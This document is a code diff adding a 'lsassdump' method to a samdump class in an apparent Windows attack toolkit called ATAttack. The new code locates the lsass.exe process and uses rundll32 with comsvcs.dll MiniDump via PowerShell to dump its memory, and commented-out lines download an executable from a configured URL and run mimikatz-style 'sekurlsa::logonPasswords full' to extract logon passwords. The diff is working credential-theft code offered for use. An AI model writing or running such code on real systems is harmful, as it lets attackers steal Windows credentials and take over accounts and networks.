@@ -5,6 +5,8 @@ from ATAttack.framework.win32.hashdump import dump_file_hashes
 from ATAttack.framework.constant import constant
 import subprocess
 import os
+import wget
+import re
 
 try:
     import _subprocess as sub
@@ -61,3 +63,18 @@ class samdump:
                     os.remove(constant.hives[h])
                 except Exception:
                     pass
+
+    def lsassdump(self):
+
+        tasklist = os.popen('tasklist /svc | findstr lsass.exe').read()
+        regex = re.findall(r'\d+', tasklist, re.S)
+        payload = r'powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump {} {} full"'.format(
+            regex[0], constant.dump_name)
+        os.popen(payload)
+        # try:
+        #     wget.download(url=constant.pyurl,out=constant.pyexe)
+        #     payload1 = '{exe} "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > {file}'.format(exe=constant.pyexe,file=constant.pyname)
+        #     os.popen(payload1)
+        #     print("lsass.exe process to Sucessfull")
+        # except:
+        #     pass
